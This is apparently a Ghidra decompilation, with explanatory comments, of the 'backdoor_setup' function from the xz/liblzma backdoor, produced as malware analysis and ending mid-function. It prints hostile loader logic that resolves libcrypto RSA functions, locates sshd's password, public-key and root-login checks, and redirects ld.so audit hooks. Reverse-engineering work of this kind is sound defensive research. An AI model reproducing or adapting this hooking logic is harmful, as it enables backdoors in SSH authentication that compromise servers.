// /home/kali/xzre-ghidra/xzregh/105830_backdoor_setup.c
// Function: backdoor_setup @ 0x105830
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_setup(backdoor_setup_params_t * params)


/*
 * AutoDoc: The loader’s main workhorse. It snapshots the caller’s GOT/stack, builds a local `backdoor_data_t` describing all observed
 * modules, resolves sshd/libcrypto/liblzma/libc/ld.so via `process_shared_libraries`, initialises the shared globals, and pulls in
 * the `backdoor_hooks_data_t` blob sitting inside liblzma. With those pieces it refreshes the string-reference catalogue,
 * configures the global context (payload buffers, sshd/log contexts, import tables), runs the sensitive-data + sshd-metadata
 * discovery routines, and finally rewires ld.so’s audit tables so `backdoor_symbind64` is invoked for every sshd→libcrypto PLT
 * call. On success it copies the updated hook table back into liblzma and leaves the cpuid GOT slot ready to resume execution.
 */

#include "xzre_types.h"

BOOL backdoor_setup(backdoor_setup_params_t *params)

{
  global_context_t *ctx;
  imported_funcs_t *imported_funcs;
  u32 *resolved_count_ptr;
  audit_ifaces *audit_ifaces_ptr;
  elf_handles_t *elf_handles;
  uint log_string_slot;
  u32 resolver_status;
  u64 *cpuid_got_entry;
  u64 *frame_address;
  backdoor_hooks_ctx_t *hooks_ctx;
  backdoor_hooks_data_t **hooks_data_addr_ptr;
  u64 signed_data_size;
  pfn_RSA_get0_key_t hook_RSA_get0_key;
  pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
  sshd_monitor_func_t mm_answer_keyverify_fn;
  elf_symbol_get_addr_fn sym_get_addr;
  Elf64_Addr libcrypto_sym_offset;
  Elf64_Ehdr *libcrypto_ehdr;
  sshd_ctx_t *sshd_ctx_ptr;
  byte *hook_table_bytes;
  u32 *resolved_count_cursor;
  u32 resolved_mask0;
  u32 resolved_mask1;
  u32 resolved_mask2;
  BOOL success_flag;
  elf_info_t *elf_info;
  u8 reg_tmp;
  EncodedStringId EVar25;
  BOOL BVar26;
  void *code_segment;
  lzma_allocator *libc_allocator;
  pfn_malloc_usable_size_t malloc_usable_size_stub;
  lzma_allocator *libcrypto_allocator;
  elf_info_t *libcrypto_info;
  pfn_EVP_MD_CTX_new_t ppVar32;
  void *data_segment;
  elf_functions_t *peVar34;
  pfn_BN_free_t BN_free_stub;
  Elf64_Sym *bn_bin2bn_sym;
  char *pcVar37;
  pfn_BN_bn2bin_t BN_bn2bin_stub;
  Elf64_Sym *bn_dup_sym;
  Elf64_Sym *rsa_free_sym;
  pfn_RSA_set0_key_t RSA_set0_key_stub;
  Elf64_Sym *rsa_sign_sym;
  Elf64_Rela *mem_address;
  int *tls_slot;
  u8 *offset_patch_ptr;
  long loop_idx;
  u8 *payload_cursor;
  Elf64_Ehdr *string_begin;
  u8 *payload_end;
  backdoor_data_t *pbVar48;
  elf_entry_ctx_t *peVar49;
  global_context_t *pgVar50;
  backdoor_hooks_data_t *pbVar51;
  sshd_ctx_t *sshd_ctx_cursor;
  sshd_log_ctx_t *sshd_log_ctx;
  imported_funcs_t *imported_funcs_cursor;
  u8 *lzma_code_end;
  dasm_ctx_t *insn_ctx_cursor;
  audit_ifaces *paVar57;
  u8 reg_lower;
  u8 reg_upper;
  u8 *sshd_code_end_ptr;
  sshd_monitor_func_t *mm_answer_keyverify_sym;
  int search_hit_count;
  u8 zero_seed;
  string_references_t string_refs;
  backdoor_shared_libraries_data_t shared_maps;
  backdoor_data_t backdoor_data;
  backdoor_hooks_data_t *hooks;
  global_context_t *global_ctx;
  u8 *local_b48;
  u8 *local_b20;
  backdoor_hooks_data_t *local_b10;
  EncodedStringId local_acc;
  ptrdiff_t local_ac8;
  pfn_RSA_public_decrypt_t *local_ac0;
  pfn_EVP_PKEY_set1_RSA_t *local_ab8;
  pfn_RSA_get0_key_t *local_ab0;
  void *local_aa8;
  u64 local_aa0;
  u64 local_a98;
  u64 local_a90;
  main_elf_t local_a88;
  u64 *local_a70;
  backdoor_shared_libraries_data_t local_a68;
  dasm_ctx_t local_a30;
  dasm_ctx_t local_9d8;
  backdoor_data_t local_980;
  
  zero_seed = 0;
  local_acc = 0;
  pbVar48 = &local_980;
  for (loop_idx = 0x256; loop_idx != 0; loop_idx = loop_idx + -1) {
    *(undefined4 *)&pbVar48->sshd_link_map = 0;
    pbVar48 = (backdoor_data_t *)((long)&pbVar48->sshd_link_map + 4);
  }
  elf_handles = &local_980.elf_handles;
  local_980.elf_handles.dynamic_linker = &local_980.dynamic_linker_info;
  local_980.elf_handles.libc = &local_980.libc_info;
  local_ac8 = 0;
  local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
  local_ab8 = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
  local_ab0 = (pfn_RSA_get0_key_t *)0x0;
  local_aa8 = (void *)0x0;
  peVar49 = params->entry_ctx;
  local_980.elf_handles.liblzma = &local_980.liblzma_info;
  local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
  local_980.elf_handles.main = &local_980.main_info;
  local_980.data_handle.runtime_data = &local_980;
  local_980.data_handle.cached_elf_handles = elf_handles;
  update_got_address(peVar49);
  code_segment = (peVar49->got_ctx).tls_got_entry;
  if (code_segment != (void *)0x0) {
    cpuid_got_entry = *(u64 **)((long)code_segment + (peVar49->got_ctx).cpuid_slot_index * 8 + 0x18);
    frame_address = peVar49->resolver_frame;
    loop_idx = (long)frame_address - (long)cpuid_got_entry;
    if (frame_address <= cpuid_got_entry) {
      loop_idx = (long)cpuid_got_entry - (long)frame_address;
    }
    if (loop_idx < 0x50001) {
      string_begin = (Elf64_Ehdr *)((ulong)cpuid_got_entry & 0xfffffffffffff000);
      libcrypto_ehdr = string_begin + -0x800;
LAB_00105951:
      EVar25 = get_string_id((char *)string_begin,(char *)0x0);
      if (EVar25 != STR_ELF) goto code_r0x00105962;
      local_a88.__libc_stack_end = &local_aa8;
      local_a70 = params->entry_ctx->resolver_frame;
      local_a88.elf_handles = elf_handles;
      local_a88.dynamic_linker_ehdr = string_begin;
      BVar26 = main_elf_parse(&local_a88);
      if (BVar26 != FALSE) {
        local_980.active_lzma_allocator = get_lzma_allocator();
        loop_idx = 0;
        do {
          *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx) =
               *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx);
          loop_idx = loop_idx + 1;
        } while (loop_idx != 0x18);
        local_a68.rsa_public_decrypt_slot = &local_ac0;
        local_a68.evp_set1_rsa_slot = &local_ab8;
        local_a68.rsa_get0_key_slot = &local_ab0;
        local_a68.hooks_data_slot = params->hook_ctx->hooks_data_slot_ptr;
        local_a68.shared_maps = &local_980;
        local_a68.elf_handles = elf_handles;
        local_a68.libc_imports = &local_980.libc_imports;
        BVar26 = process_shared_libraries(&local_a68);
        if (BVar26 == FALSE) goto LAB_00105a59;
        local_b10 = *params->hook_ctx->hooks_data_slot_ptr;
        ctx = &local_b10->global_ctx;
        imported_funcs = &local_b10->imported_funcs;
        pgVar50 = ctx;
        for (loop_idx = 0x5a; loop_idx != 0; loop_idx = loop_idx + -1) {
          pgVar50->uses_endbr64 = FALSE;
          pgVar50 = (global_context_t *)((long)pgVar50 + (ulong)zero_seed * -8 + 4);
        }
        (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
        hooks_ctx = params->hook_ctx;
        (local_b10->global_ctx).imported_funcs = imported_funcs;
        (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
        hooks_data_addr_ptr = hooks_ctx->hooks_data_slot_ptr;
        (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
        pbVar51 = *hooks_data_addr_ptr;
        signed_data_size = pbVar51->signed_data_size;
        (local_b10->global_ctx).current_data_size = 0;
        (local_b10->global_ctx).payload_data = &pbVar51->signed_data;
        (local_b10->global_ctx).payload_data_size = signed_data_size;
        elf_find_string_references(&local_980.main_info,&local_980.sshd_string_refs);
        local_aa0 = 0;
        code_segment = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
        if (code_segment != (void *)0x0) {
          (local_b10->global_ctx).lzma_code_start = code_segment;
          (local_b10->global_ctx).lzma_code_end = (void *)((long)code_segment + local_aa0);
          pbVar51 = local_b10;
          for (loop_idx = 0x4e; loop_idx != 0; loop_idx = loop_idx + -1) {
            (pbVar51->ldso_ctx)._unknown1459[0] = '\0';
            (pbVar51->ldso_ctx)._unknown1459[1] = '\0';
            (pbVar51->ldso_ctx)._unknown1459[2] = '\0';
            (pbVar51->ldso_ctx)._unknown1459[3] = '\0';
            pbVar51 = (backdoor_hooks_data_t *)((long)pbVar51 + (ulong)zero_seed * -8 + 4);
          }
          hooks_ctx = params->hook_ctx;
          (local_b10->ldso_ctx).imported_funcs = imported_funcs;
          hook_RSA_get0_key = hooks_ctx->rsa_get0_key_entry;
          (local_b10->ldso_ctx).hook_RSA_public_decrypt = hooks_ctx->rsa_public_decrypt_entry;
          hook_EVP_PKEY_set1_RSA = params->shared_globals->evp_set1_rsa_hook_entry;
          (local_b10->ldso_ctx).hook_RSA_get0_key = hook_RSA_get0_key;
          (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
          sshd_ctx_cursor = &local_b10->sshd_ctx;
          for (loop_idx = 0x38; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
            sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + (ulong)zero_seed * -8 + 4);
          }
          (local_b10->sshd_ctx).mm_answer_authpassword_hook =
               params->shared_globals->authpassword_hook_entry;
          mm_answer_keyverify_fn = params->hook_ctx->mm_answer_keyverify_entry;
          (local_b10->sshd_ctx).mm_answer_keyallowed = params->hook_ctx->mm_answer_keyallowed_entry;
          (local_b10->sshd_ctx).mm_answer_keyverify = mm_answer_keyverify_fn;
          sshd_log_ctx = &local_b10->sshd_log_ctx;
          for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_log_ctx->logging_disabled = FALSE;
            sshd_log_ctx = (sshd_log_ctx_t *)((long)sshd_log_ctx + (ulong)zero_seed * -8 + 4);
          }
          (local_b10->sshd_log_ctx).mm_log_handler = params->hook_ctx->mm_log_handler_entry;
          *params->shared_globals->global_ctx_slot = ctx;
          imported_funcs_cursor = imported_funcs;
          for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(undefined4 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
            imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + (ulong)zero_seed * -8 + 4);
          }
          (local_b10->imported_funcs).RSA_public_decrypt_plt = local_ac0;
          (local_b10->imported_funcs).EVP_PKEY_set1_RSA_plt = local_ab8;
          (local_b10->imported_funcs).RSA_get0_key_plt = local_ab0;
          loop_idx = 0;
          do {
            (local_b10->sshd_log_ctx).log_padding[loop_idx + -0x7c] =
                 *(u8 *)((long)&local_980.libc_imports.resolved_imports_count + loop_idx);
            loop_idx = loop_idx + 1;
          } while (loop_idx != 0x70);
          (local_b10->imported_funcs).libc = &local_b10->libc_imports;
          (local_b10->libc_imports).__libc_stack_end = local_aa8;
          libc_allocator = get_lzma_allocator();
          libc_allocator->opaque = local_980.elf_handles.libc;
          malloc_usable_size_stub = (pfn_malloc_usable_size_t)lzma_alloc(0x440,libc_allocator);
          (local_b10->libc_imports).malloc_usable_size = malloc_usable_size_stub;
          if (malloc_usable_size_stub != (pfn_malloc_usable_size_t)0x0) {
            (local_b10->libc_imports).resolved_imports_count =
                 (local_b10->libc_imports).resolved_imports_count + 1;
          }
          BVar26 = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
          ;
          if (BVar26 == FALSE) goto LAB_00105a60;
          libcrypto_allocator = get_lzma_allocator();
          libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
          libcrypto_info = local_980.elf_handles.libcrypto;
          if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
            libcrypto_info = (elf_info_t *)
                      elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
            ppVar32 = (pfn_EVP_MD_CTX_new_t)lzma_alloc(0xaf8,libcrypto_allocator);
            (local_b10->imported_funcs).EVP_MD_CTX_new = ppVar32;
            if (ppVar32 != (pfn_EVP_MD_CTX_new_t)0x0) {
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          elf_info = local_980.elf_handles.main;
          local_a30.instruction = (u8 *)0x0;
          local_9d8.instruction = (u8 *)0x0;
          code_segment = elf_get_code_segment(local_980.elf_handles.main,(u64 *)&local_a30);
          sshd_code_end_ptr = local_a30.instruction + (long)code_segment;
          data_segment = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
          (local_b10->global_ctx).sshd_code_start = code_segment;
          (local_b10->global_ctx).sshd_code_end = sshd_code_end_ptr;
          (local_b10->global_ctx).sshd_data_start = data_segment;
          (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)data_segment;
          peVar34 = get_elf_functions_address();
          if (((peVar34 == (elf_functions_t *)0x0) ||
              (sym_get_addr = peVar34->elf_symbol_get_addr, sym_get_addr == (elf_symbol_get_addr_fn)0x0)) ||
             (peVar34->elf_parse == (elf_parse_fn)0x0)) goto LAB_00105a60;
          bn_bin2bn_sym = (Elf64_Sym *)0x0;
          BN_free_stub = (pfn_BN_free_t)(*sym_get_addr)(local_980.elf_handles.libcrypto,STR_BN_free);
          (local_b10->imported_funcs).BN_free = BN_free_stub;
          if (BN_free_stub != (pfn_BN_free_t)0x0) {
            bn_bin2bn_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
          }
          local_acc = STR_ssh_rsa_cert_v01_openssh_com;
          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
          (local_b10->global_ctx).STR_ssh_rsa_cert_v01_openssh_com = pcVar37;
          if (pcVar37 == (char *)0x0) goto LAB_00105a60;
          local_acc = STR_rsa_sha2_256;
          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
          (local_b10->global_ctx).STR_rsa_sha2_256 = pcVar37;
          if (pcVar37 == (char *)0x0) goto LAB_00105a60;
          bn_dup_sym = (Elf64_Sym *)0x0;
          BN_bn2bin_stub = (pfn_BN_bn2bin_t)
                    elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
          (local_b10->imported_funcs).BN_bn2bin = BN_bn2bin_stub;
          if (BN_bn2bin_stub != (pfn_BN_bn2bin_t)0x0) {
            bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
            if (bn_dup_sym != (Elf64_Sym *)0x0) {
              libcrypto_sym_offset = bn_dup_sym->st_value;
              libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (local_b10->imported_funcs).BN_dup = (pfn_BN_dup_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
            }
            bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
            if ((local_b10->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          rsa_free_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
          RSA_set0_key_stub = (pfn_RSA_set0_key_t)(*sym_get_addr)(local_980.elf_handles.libcrypto,STR_RSA_set0_key)
          ;
          rsa_sign_sym = (Elf64_Sym *)0x0;
          (local_b10->imported_funcs).RSA_set0_key = RSA_set0_key_stub;
          if (RSA_set0_key_stub != (pfn_RSA_set0_key_t)0x0) {
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            rsa_sign_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
            if (libcrypto_info != (elf_info_t *)0x0) {
              libcrypto_sym_offset = libcrypto_info->load_base_vaddr;
              libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (local_b10->imported_funcs).RSA_get0_key_resolved =
                   (pfn_RSA_get0_key_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
            }
          }
          if ((local_b10->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
          }
          BVar26 = sshd_find_sensitive_data
                             (local_980.elf_handles.main,local_980.elf_handles.libcrypto,
                              &local_980.sshd_string_refs,imported_funcs,ctx);
          if (BVar26 == FALSE) goto LAB_00105a60;
          if (bn_bin2bn_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = bn_bin2bn_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          if (bn_dup_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = bn_dup_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_new = (pfn_RSA_new_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          if (rsa_free_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = rsa_free_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_free = (pfn_RSA_free_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          if (rsa_sign_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = rsa_sign_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          bn_bin2bn_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
          libcrypto_info = local_980.elf_handles.main;
          sshd_ctx_cursor = (local_b10->global_ctx).sshd_ctx;
          local_a30.instruction = (u8 *)0x0;
          local_a98 = local_a98 & 0xffffffff00000000;
          sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
          sshd_ctx_cursor->have_mm_answer_authpassword = FALSE;
          sshd_ctx_cursor->have_mm_answer_keyverify = FALSE;
          code_segment = elf_get_data_segment(local_980.elf_handles.main,(u64 *)&local_a30,FALSE);
          sshd_code_end_ptr = local_a30.instruction;
          if ((code_segment != (void *)0x0) &&
             (local_980.sshd_string_refs.entries[0x12].func_start != (void *)0x0)) {
            sshd_ctx_cursor->mm_request_send_start = local_980.sshd_string_refs.entries[0x12].func_start;
            sshd_ctx_cursor->mm_request_send_end = local_980.sshd_string_refs.entries[0x12].func_end;
            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
            pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a98,(void *)0x0);
            sshd_ctx_cursor->STR_without_password = pcVar37;
            if ((pcVar37 != (char *)0x0) &&
               (BVar26 = elf_find_function_pointer
                                   (XREF_mm_answer_authpassword,
                                    &sshd_ctx_cursor->mm_answer_authpassword_start,
                                    &sshd_ctx_cursor->mm_answer_authpassword_end,
                                    &sshd_ctx_cursor->mm_answer_authpassword_ptr,libcrypto_info,
                                    &local_980.sshd_string_refs,ctx), BVar26 == FALSE)) {
              sshd_ctx_cursor->mm_answer_authpassword_start = (void *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
            }
            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x7b8);
            pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a98,(void *)0x0);
            sshd_ctx_cursor->STR_publickey = pcVar37;
            if (pcVar37 != (char *)0x0) {
              BVar26 = elf_find_function_pointer
                                 (XREF_mm_answer_keyallowed,&sshd_ctx_cursor->mm_answer_keyallowed_start,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_end,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_ptr,libcrypto_info,
                                  &local_980.sshd_string_refs,ctx);
              if (BVar26 == FALSE) {
                sshd_ctx_cursor->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_end = (void *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_ptr = (void *)0x0;
              }
              else {
                BVar26 = elf_find_function_pointer
                                   (XREF_mm_answer_keyverify,&sshd_ctx_cursor->mm_answer_keyverify_start,
                                    &sshd_ctx_cursor->mm_answer_keyverify_end,
                                    &sshd_ctx_cursor->mm_answer_keyverify_ptr,libcrypto_info,
                                    &local_980.sshd_string_refs,ctx);
                if (BVar26 == FALSE) {
                  sshd_ctx_cursor->mm_answer_keyverify_start = (void *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_end = (void *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_ptr = (void *)0x0;
                }
              }
            }
            if ((sshd_ctx_cursor->mm_answer_authpassword_start != (void *)0x0) ||
               (sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
              sshd_ctx_ptr = (local_b10->global_ctx).sshd_ctx;
              local_9d8.instruction = (u8 *)0x0;
              mm_answer_keyverify_sym = (sshd_monitor_func_t *)sshd_ctx_ptr->mm_answer_authpassword_start;
              if (mm_answer_keyverify_sym == (sshd_monitor_func_t *)0x0) {
                mm_answer_keyverify_sym = sshd_ctx_ptr->mm_answer_keyallowed_start;
                if (mm_answer_keyverify_sym == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
                payload_end = (u8 *)sshd_ctx_ptr->mm_answer_keyallowed_end;
              }
              else {
                payload_end = (u8 *)sshd_ctx_ptr->mm_answer_authpassword_end;
              }
              success_flag = FALSE;
              pcVar37 = (char *)0x0;
              local_a90 = CONCAT44(*(uint *)((u8 *)&local_a90 + 4),0x198);
              while (pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a90,pcVar37),
                    pcVar37 != (char *)0x0) {
                local_9d8.instruction = (u8 *)0x0;
                EVar25 = (EncodedStringId)pcVar37;
                mem_address = elf_find_rela_reloc(libcrypto_info,EVar25,0);
                if (mem_address == (Elf64_Rela *)0x0) {
                  local_9d8.instruction = (u8 *)0x0;
                  success_flag = TRUE;
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(libcrypto_info,EVar25);
                }
                while (mem_address != (Elf64_Rela *)0x0) {
                  do {
                    BVar26 = elf_contains_vaddr_relro(libcrypto_info,(u64)mem_address,8,1);
                    if ((BVar26 != FALSE) &&
                       (BVar26 = find_instruction_with_mem_operand_ex
                                           ((u8 *)mm_answer_keyverify_sym,payload_end,(dasm_ctx_t *)0x0,0x109,
                                            mem_address), BVar26 != FALSE)) {
                      data_segment = sshd_ctx_cursor->mm_answer_authpassword_start;
                      ((local_b10->global_ctx).sshd_ctx)->STR_unknown_ptr = (char *)mem_address;
                      if (data_segment != (void *)0x0) {
                        sshd_ctx_cursor->have_mm_answer_authpassword = TRUE;
                      }
                      if ((sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
                         (sshd_ctx_cursor->have_mm_answer_keyallowed = TRUE,
                         sshd_ctx_cursor->mm_answer_keyverify_start != (void *)0x0)) {
                        sshd_ctx_cursor->have_mm_answer_keyverify = TRUE;
                      }
                      tls_slot = (int *)find_addr_referenced_in_mov_instruction
                                                 (XREF_start_pam,&local_980.sshd_string_refs,code_segment
                                                  ,sshd_code_end_ptr + (long)code_segment);
                      if (tls_slot != (int *)0x0) {
                        ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = tls_slot;
                      }
                      insn_ctx_cursor = &local_9d8;
                      success_flag = FALSE;
                      *(uint *)&local_9d8.instruction_size = 0x70;
                      local_9d8.instruction = (u8 *)0xc5800000948;
                      goto LAB_00106471;
                    }
                    if (success_flag) goto LAB_001063c8;
                    mem_address = elf_find_rela_reloc(libcrypto_info,EVar25,0);
                  } while (mem_address != (Elf64_Rela *)0x0);
                  local_9d8.instruction = (u8 *)0x0;
LAB_001063c8:
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(libcrypto_info,EVar25);
                  success_flag = TRUE;
                }
                pcVar37 = pcVar37 + 8;
              }
            }
          }
          goto LAB_001065af;
        }
        goto LAB_00105a60;
      }
    }
  }
LAB_00105a59:
  local_b10 = (backdoor_hooks_data_t *)0x0;
  goto LAB_00105a60;
code_r0x00105962:
  string_begin = string_begin + -0x40;
  if (string_begin == libcrypto_ehdr) goto LAB_00105a59;
  goto LAB_00105951;
LAB_00106471:
  do {
    pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)insn_ctx_cursor,(void *)0x0);
    if (pcVar37 != (char *)0x0) {
      if (success_flag) {
        ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
        goto LAB_001064b8;
      }
      success_flag = TRUE;
    }
    insn_ctx_cursor = (dasm_ctx_t *)((long)&insn_ctx_cursor->instruction + 4);
  } while (insn_ctx_cursor != (dasm_ctx_t *)((long)&local_9d8.instruction_size + 4));
  ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
LAB_001064b8:
  tls_slot = (int *)find_addr_referenced_in_mov_instruction
                             (XREF_auth_root_allowed,&local_980.sshd_string_refs,code_segment,
                              sshd_code_end_ptr + (long)code_segment);
  if (tls_slot != (int *)0x0) {
    if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
       ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
      search_hit_count = 0;
      loop_idx = 0;
      *(uint *)&local_9d8.instruction_size = 0x10;
      local_9d8.instruction = (u8 *)0xf0000000e;
      hooks = (backdoor_hooks_data_t *)0x0;
      do {
        sshd_code_end_ptr = (u8 *)local_980.sshd_string_refs.entries
                        [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_start;
        if (sshd_code_end_ptr != (u8 *)0x0) {
          payload_end = (u8 *)local_980.sshd_string_refs.entries
                          [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_end;
          search_hit_count = search_hit_count + 1;
          BVar26 = find_instruction_with_mem_operand(sshd_code_end_ptr,payload_end,(dasm_ctx_t *)0x0,tls_slot);
          if ((BVar26 != FALSE) ||
             (BVar26 = find_add_instruction_with_mem_operand
                                 (sshd_code_end_ptr,payload_end,(dasm_ctx_t *)0x0,tls_slot), BVar26 != FALSE)) {
            hooks = (backdoor_hooks_data_t *)(ulong)((int)hooks + 1);
          }
        }
        loop_idx = loop_idx + 1;
      } while (loop_idx != 3);
      if ((search_hit_count != 0) && ((int)hooks == 0)) goto LAB_001065af;
    }
    ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = tls_slot;
  }
LAB_001065af:
  bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
  BVar26 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.sshd_string_refs,ctx);
  if (BVar26 == FALSE) {
    (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
    (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
  }
  sshd_log_ctx = (local_b10->global_ctx).sshd_log_ctx;
  libc_allocator->opaque = local_980.elf_handles.libc;
  local_a98 = 0;
  sshd_log_ctx->logging_disabled = FALSE;
  sshd_log_ctx->log_hooking_possible = FALSE;
  code_segment = elf_get_code_segment(&local_980.main_info,&local_a98);
  signed_data_size = local_a98;
  if ((((code_segment != (void *)0x0) && (0x10 < local_a98)) &&
      ((u8 *)local_980.sshd_string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
     (((local_b10->global_ctx).uses_endbr64 == FALSE ||
      (BVar26 = is_endbr64_instruction
                          ((u8 *)local_980.sshd_string_refs.entries[0x19].func_start,
                           (u8 *)((long)local_980.sshd_string_refs.entries[0x19].func_start + 4),
                           0xe230), BVar26 != FALSE)))) {
    sshd_log_ctx->sshlogv = local_980.sshd_string_refs.entries[0x19].func_start;
    insn_ctx_cursor = &local_a30;
    for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(undefined4 *)&insn_ctx_cursor->instruction = 0;
      insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
    }
    if ((u8 *)local_980.sshd_string_refs.entries[0x1a].func_start != (u8 *)0x0) {
      local_b48 = (u8 *)local_980.sshd_string_refs.entries[0x1a].func_start;
      local_b20 = (u8 *)0x0;
      sshd_code_end_ptr = (u8 *)0x0;
      do {
